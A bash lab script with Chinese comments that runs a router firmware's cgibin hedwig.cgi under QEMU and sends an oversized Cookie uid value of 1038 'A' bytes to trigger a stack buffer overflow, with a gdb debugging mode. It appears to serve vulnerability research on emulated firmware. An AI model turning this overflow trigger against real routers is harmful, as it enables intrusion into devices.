#!/usr/bin/env bash
# 方式 C(docker 版):QEMU user 跑 cgibin
#
# 注意:本固件的 hedwig.cgi 不是文件,而是 cgibin 按 REQUEST_URI 分发的虚拟入口,
#       所以 ENTRY(argv[0]) 和 REQUEST_URI 必须同时设置,单进程目标是 htdocs/cgibin。
#
# 想免 docker 跑,用 tools/run-local.sh。
set -euo pipefail

ARCH="${ARCH:-mipsel}"
ROOTFS="${ROOTFS:-/rootfs}"
ENTRY="${ENTRY:-/hedwig.cgi}"          # 虚拟入口,同时用作 argv[0] 和 REQUEST_URI
MODE="${MODE:-run}"                    # run | gdb
LEN="${LEN:-1038}"
PAYLOAD="${PAYLOAD:-$(printf 'A%.0s' $(seq 1 "$LEN"))}"

QEMU="qemu-${ARCH}-static"
command -v "$QEMU" >/dev/null 2>&1 || {
    echo "[x] 没有 $QEMU;可用的是:" >&2
    ls /usr/bin/qemu-*static 2>/dev/null | head -n 20 >&2
    exit 1
}

[ -d "$ROOTFS" ] || { echo "[x] rootfs 不存在: $ROOTFS" >&2; exit 1; }
BIN="$ROOTFS/htdocs/cgibin"
[ -x "$BIN" ] || { echo "[x] 找不到 $BIN" >&2; exit 1; }

echo "[*] $QEMU -L $ROOTFS"
echo "[*] entry=$ENTRY  目标=${BIN#"$ROOTFS"}"
echo "[*] Cookie: uid=<${#PAYLOAD} 字节>"

ARGS=(
    -L "$ROOTFS"
    -0 "$ENTRY"
    -E "REQUEST_METHOD=POST"
    -E "REQUEST_URI=$ENTRY"
    -E "SCRIPT_NAME=$ENTRY"
    -E "SERVER_PORT=80"
    -E "SERVER_NAME=192.168.0.1"
    -E "CONTENT_TYPE=application/x-www-form-urlencoded"
    -E "CONTENT_LENGTH=0"
    -E "HTTP_COOKIE=uid=$PAYLOAD"
)

if [ "$MODE" = "gdb" ]; then
    ARGS+=(-g 6666)
    echo "[*] gdbserver 监听 6666,等待 gdb-multiarch 连接"
fi

ulimit -c 0 2>/dev/null || true
set +e
"$QEMU" "${ARGS[@]}" "$BIN"
RC=$?
set -e

echo "[*] 退出码: $RC"
case "$RC" in
    139) echo "[!] SIGSEGV —— 溢出已触发" ;;
    0|255) echo "[*] 正常返回,该长度未触发" ;;
esac
exit "$RC"
